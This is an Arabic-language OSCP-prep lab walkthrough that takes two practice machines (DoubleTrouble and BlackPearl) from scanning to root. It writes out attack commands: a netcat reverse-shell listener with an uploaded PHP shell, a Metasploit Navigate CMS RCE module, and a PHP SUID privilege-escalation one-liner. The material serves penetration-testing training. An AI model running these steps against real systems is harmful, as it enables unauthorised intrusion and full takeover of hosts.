تجميع كل اللي فات في سيناريوهات حقيقية! (DoubleTrouble & BlackPearl)

Scenarios Practical OSCP Prep

دلوقتي إحنا خلصنا كل الأساسيات (Recon → Scanning → Enum → Vuln Analysis → Exploitation → PrivEsc). في الـ Capstone ده، هنمشي في سيناريوهين حقيقيين من الصفر لحد الـ Root كأنك قاعد في امتحان الـ OSCP.

💀 Scenario 1: DoubleTrouble

Steganography · File Upload · PrivEsc

🧭 1. Host Discovery
nmap -sn 192.168.1.0/24

لمعرفة الأجهزة الشغالة على الشبكة.

🌐 2. Comprehensive Scan
nmap -sS -sV -O 192.168.1.5

لجلب الـ Ports, Services, والـ OS.

💣 3. Vulnerability Analysis
searchsploit [service_name]

للبحث عن ثغرات جاهزة للخدمات الشغالة.

📂 4. Subdirectory Enumeration
dirb http://192.168.1.5

اكتشفنا مسار مخفي: /secret

🖼️ 5. Steganography (خطوة ذكية 🔥)

لقينا صورة جوه /secret، استخرجنا منها البيانات:

stegseek image.jpg

طلعنا منها username + password!

🔑 6. Login & Upload

استخدمنا الـ Credentials وسجلنا دخول.

اكتشفنا ميزة File Upload مصابة بثغرة (بدون Validation).

💀 7-9. Exploitation to ROOT
1. Reverse Shell

نفتح Listener:

nc -lvnp 4444

نرفع shell.php ونشغله.

2. PrivEsc Enum

جوه الـ shell نشغل:

./linpeas.sh

ندور على SUID, cron, أو passwords.

3. ROOT! 🔥

نستغل الـ Misconfiguration.

# whoami
root

🧠 Scenario 2: BlackPearl

DNS Trick · CMS Exploit · SUID (GTFOBins)

  • 🧭 1. Discovery & 🔍 2. Scan
    nmap -sn 192.168.1.0/24
    nmap -sV 192.168.1.5
  • 📂 3. Enum & 🧠 4. Page Source
    dirb http://192.168.1.5

    لقينا /secret
    شوفنا الـ View Source لقينا Domain Name!

  • 🌐 5. DNS Trick & 🔍 6. Subdomain

    نضيف الدومين للـ hosts file عشان السيرفر يقدر يوجهنا صح (Virtual Hosting):

    echo "192.168.1.5 target.local" >> /etc/hosts

    عملنا Scan بالدومين الجديد لقينا: Navigate CMS

  • 💣 7. CMS Exploit & 👤 8. User Shell
    searchsploit navigate cms

    لقينا ثغرة RCE! نستخدمها في Metasploit.

    msfconsole
    use exploit/multi/http/navigate_cms_rce
    set RHOSTS 192.168.1.5
    run

    ✅ حصلنا على Shell بصلاحيات www-data.

  • 🔍 9. PrivEsc & 💣 10. SUID (GTFOBins)

    شغلنا ./linpeas.sh ولقينا إن أمر php واخد SUID bit!

    🔥 استغلال GTFOBins:

    دخلنا موقع GTFOBins ولقينا طريقة لترقية الصلاحيات باستخدام PHP SUID:

    php -r 'system("/bin/bash");'
    # ROOT 🔥🔥🔥
